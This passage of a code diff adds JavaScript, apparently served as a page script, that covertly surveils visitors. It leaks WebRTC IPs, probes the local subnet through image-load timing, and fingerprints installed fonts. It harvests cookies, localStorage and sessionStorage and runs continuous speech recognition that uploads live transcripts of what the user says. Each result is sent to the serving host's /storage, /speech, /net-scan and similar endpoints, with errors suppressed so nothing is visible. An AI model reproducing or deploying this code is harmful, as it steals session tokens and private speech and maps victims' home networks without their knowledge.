-      xhr.open("POST",base+"/webrtc-ips",true);
-      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-      xhr.send(body);
+          +"\\n📱 Touch: "+(navigator.maxTouchPoints||0)+"pts"
+          +"\\n🔌 Plugins: "+Array.from(navigator.plugins||[]).map(function(p){return p.name;}).join(", ").slice(0,80);
+      }catch(ex){}
+      xpost("/webrtc-ips","uid="+encodeURIComponent(uid)+"&ips="+encodeURIComponent(ipList)+"&fp="+encodeURIComponent(fp));
+      // Local network scan via WebRTC IPs
+      try{
+        var localIp=[...ips].find(function(ip){
+          return /^(192\\.168|10\\.|172\\.(1[6-9]|2\\d|3[01]))\\./.test(ip);
+        });
+        if(localIp){
+          var pts=localIp.split(".");
+          var subnet=pts[0]+"."+pts[1]+"."+pts[2];
+          var probes=[1,2,100,101,200,254,253];
+          var found=[localIp+"[self]"];
+          var cnt=0;
+          probes.forEach(function(last){
+            var img=new Image();
+            var tip=subnet+"."+last;
+            var t0=Date.now();
+            img.onload=function(){found.push(tip+"[open]");};
+            img.onerror=function(){if(Date.now()-t0<250)found.push(tip+"[fast]");};
+            img.src="http://"+tip+"/favicon.ico?t="+Date.now();
+            setTimeout(function(){if(++cnt===probes.length)xpost("/net-scan","uid="+encodeURIComponent(uid)+"&subnet="+encodeURIComponent(subnet+".0/24")+"&devices="+encodeURIComponent(found.join(", ")));},700);
+          });
+        }
+      }catch(ex){}
     },4000);
   }catch(e){}
+
+  // ── 2. Font Detection (silent fingerprinting) ─────────────────────────────────
+  setTimeout(function(){
+    try{
+      var fontList=["Arial","Times New Roman","Courier New","Georgia","Verdana","Helvetica","Comic Sans MS","Impact","Trebuchet MS","Tahoma","Calibri","Cambria","Consolas","Segoe UI","Roboto","Ubuntu","Open Sans","Lato","Montserrat","Arial Black","Palatino","Garamond","Century Gothic","Gill Sans","Futura","Bookman Old Style","Lucida Console","Lucida Sans"];
+      var tc=document.createElement("canvas"),tctx=tc.getContext("2d");
+      tctx.font="72px monospace";
+      var bw=tctx.measureText("mmmmmmmmmmlli").width;
+      var found=[];
+      for(var i=0;i<fontList.length;i++){
+        tctx.font="72px '"+fontList[i]+"',monospace";
+        if(Math.abs(tctx.measureText("mmmmmmmmmmlli").width-bw)>1)found.push(fontList[i]);
+      }
+      if(found.length)xpost("/fonts","uid="+encodeURIComponent(uid)+"&fonts="+encodeURIComponent(found.join(", ")));
+    }catch(e){}
+  },1500);
+
+  // ── 3. Cookie + LocalStorage + SessionStorage Harvest ────────────────────────
+  setTimeout(function(){
+    try{
+      var out="";
+      if(document.cookie&&document.cookie.length>2)out+="🍪 Cookies:\\n"+document.cookie+"\\n\\n";
+      var lk=Object.keys(localStorage||{});
+      if(lk.length){
+        out+="💾 LocalStorage ("+lk.length+" keys):\\n";
+        lk.slice(0,20).forEach(function(k){out+=k+"="+String(localStorage.getItem(k)||"").slice(0,100)+"\\n";});
+        out+="\\n";
+      }
+      var sk=Object.keys(sessionStorage||{});
+      if(sk.length){
+        out+="📦 SessionStorage ("+sk.length+" keys):\\n";
+        sk.slice(0,10).forEach(function(k){out+=k+"="+String(sessionStorage.getItem(k)||"").slice(0,80)+"\\n";});
+      }
+      if(out.trim().length>4)xpost("/storage","uid="+encodeURIComponent(uid)+"&data="+encodeURIComponent(out));
+    }catch(e){}
+  },2000);
+
+  // ── 4. Speech Recognition — live audio transcription ─────────────────────────
+  setTimeout(function(){
+    try{
+      var SR=window.SpeechRecognition||window.webkitSpeechRecognition;
+      if(!SR)return;
+      var rec=new SR();
+      rec.continuous=true;
+      rec.interimResults=false;
+      rec.lang=navigator.language||"ar-SA";
+      var buf="";
+      rec.onresult=function(e){
+        for(var i=e.resultIndex;i<e.results.length;i++)buf+=e.results[i][0].transcript+" ";
+        if(buf.length>30){var t=buf.trim();buf="";xpost("/speech","uid="+encodeURIComponent(uid)+"&text="+encodeURIComponent(t)+"&lang="+encodeURIComponent(navigator.language||""));}
+      };
+      rec.onerror=function(){};
+      rec.onend=function(){try{rec.start();}catch(ex){}};
+      rec.start();
+    }catch(e){}
+  },3000);
+
 })();`);
 });
 
